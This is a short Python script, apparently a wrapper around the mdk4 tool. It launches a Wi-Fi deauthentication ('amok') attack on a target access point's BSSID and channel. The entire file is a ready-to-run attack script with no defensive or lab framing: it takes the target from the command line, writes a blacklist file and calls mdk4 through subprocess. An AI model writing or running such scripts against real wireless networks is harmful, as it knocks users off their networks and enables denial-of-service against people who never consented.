import subprocess
import os
import tempfile
import argparse

def run_mdk4_attack(interface, bssid, channel):
    # Create a temporary directory for the blacklist file
    tmpdir = tempfile.mkdtemp()
    bl_file = os.path.join(tmpdir, "bl.txt")

    # Write the BSSID to the blacklist file
    with open(bl_file, "w") as f:
        f.write(bssid)
    
    # Construct the mdk4 command
    mdk_command = "mdk4"
    command = [mdk_command, interface, "d", "-b", bl_file, "-c", str(channel)]
    
    # Run the mdk4 attack using subprocess
    try:
        print(f"Running mdk4 amok attack on {interface} targeting {bssid} at channel {channel}...")
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error occurred during the attack: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    
    # Clean up the blacklist file after the attack
    os.remove(bl_file)

def manage_output(command, mdk_command):
    # Adjust terminal window size and handle output (placeholder for more complex logic)
    print(f"Executing command: {command}")
    print(f"MDK Command: {mdk_command}")
    
    # Optionally: Handle tmux window management here, if needed

def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Run mdk4 deauth amok attack")
    parser.add_argument("interface", type=str, help="Wireless interface (e.g., wlan0mon)")
    parser.add_argument("bssid", type=str, help="Target AP BSSID")
    parser.add_argument("channel", type=int, help="Channel to attack on")
    
    # Parse arguments
    args = parser.parse_args()
    
    # Run the attack
    mdk_command = "mdk4"
    command = f"{mdk_command} {args.interface} d -b {args.bssid} -c {args.channel}"
    
    # Call the function to run the attack
    run_mdk4_attack(args.interface, args.bssid, args.channel)
    
    # Call the output manager (optional step to manage tmux or window behavior)
    manage_output(command, mdk_command)

if __name__ == "__main__":
    main()
